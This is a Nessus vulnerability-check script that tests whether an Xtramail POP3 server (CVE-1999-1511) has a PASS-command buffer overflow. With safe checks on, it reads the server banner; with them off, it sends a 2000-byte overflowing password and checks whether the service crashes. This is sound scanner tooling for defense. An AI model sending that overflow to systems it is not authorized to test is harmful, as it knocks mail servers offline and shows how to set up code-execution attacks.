#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10325);
 script_bugtraq_id(791);
 script_version ("$Revision: 1.25 $");
 script_cve_id("CVE-1999-1511");
 
 name["english"] = "Xtramail pop3 overflow";
 name["francais"] = "Divers dépassement de buffers dans Xtramail pop3";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote pop3 server is vulnerable to the following
buffer overflow :

	USER test
	PASS <buffer>
	
This *may* allow an attacker to execute arbitrary commands
as root on the remote POP3 server.

Solution : contact your vendor, inform it of this
vulnerability, and ask for a patch

Risk factor : High";


 desc["francais"] = "
Le serveur pop distant est vulnérable à ce dépassement
de buffer :
	USER test
	PASS <buffer>
	
Ce problème pourrait permettre à un pirate d'executer des
commandes en tant que root sur le serveur distant.

Solution : demandez un patch
Facteur de risque : Elevé";
 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Attempts to overflow the in.pop3d buffers";
 summary["francais"] = "Essaye de trop remplir les buffers de in.pop3d";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "qpopper.nasl");
 script_exclude_keys("pop3/false_pop3");
 script_require_ports("Services/pop3", 110);
 exit(0);
}

#
# The script code starts here
#

fake = get_kb_item("pop3/false_pop3");
if(fake)exit(0);
port = get_kb_item("Services/pop3");
if(!port)port = 110;

if(safe_checks())
{
 banner = get_kb_item(string("pop3/banner/", port));
 if(!banner){
 		soc = open_sock_tcp(port);
                if(!soc)exit(0);
		banner = recv_line(socket:soc, length:4096);
		if ( ! banner ) exit(0);
		close(soc);
		if (substr(banner,0,2) != '+OK') exit(0);	# Not a POP3 server!
	    }
 if(banner)
 {
  b = tolower(banner);
  if("xtramail" >< b)
  {
  if( ereg(pattern:".*1\.([0-9]|1[0-1])[^0-9].*",
   	string:b)
    )
    {
     data = "
The remote pop3 server is Xtramail 1.11 or older.
This version is known for being vulnerable to a buffer
overflow in the PASS command.
	
This *may* allow an attacker to execute arbitrary commands
as root on the remote POP3 server.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : upgrade 
Risk factor : High";
     security_hole(port:port, data:data);
    }
  }
 }
 exit(0);
}


if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  r = recv_line(socket:soc, length:4096);
  if(!r)exit(0);
  
  c = string("USER test\r\n");
  send(socket:soc, data:c);
  d = recv_line(socket:soc, length:1024);
  c = string("PASS ", crap(2000), "\r\n");
  send(socket:soc, data:c);
  d = recv_line(socket:soc, length:1024, timeout:15);
  close(soc);

  soc = open_sock_tcp(port);
  if(soc)
  {
   r = recv_line(socket:soc, length:4096);
   if(!r)security_hole(port);
  }
  else
    security_hole(port);
 }
}

